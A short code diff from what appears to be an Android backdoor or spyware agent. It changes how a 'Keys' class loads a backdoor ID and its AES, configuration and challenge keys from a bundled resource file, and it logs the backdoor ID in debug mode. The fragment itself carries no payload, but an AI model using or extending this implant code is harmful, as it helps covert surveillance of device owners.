@@ -111,10 +111,10 @@ public class Keys {
 			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.resources), 0); // resources.bin
 
 			backdoorId = Utils.copy(resource, 0, 14);
-			aesKey = keyFromString(resource, 14, 32);
-			confKey = keyFromString(resource, 46, 32);
-			challengeKey = keyFromString(resource, 78, 32);
-			demoMode = keyFromString(resource, 110, 32);
+			aesKey = Utils.copy(resource, 14, 16);
+			confKey = Utils.copy(resource, 46, 16);
+			challengeKey = Utils.copy(resource, 78, 16);
+			demoMode = Utils.copy(resource, 110, 16);
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " backdoorId: " + new String(backdoorId));//$NON-NLS-1$
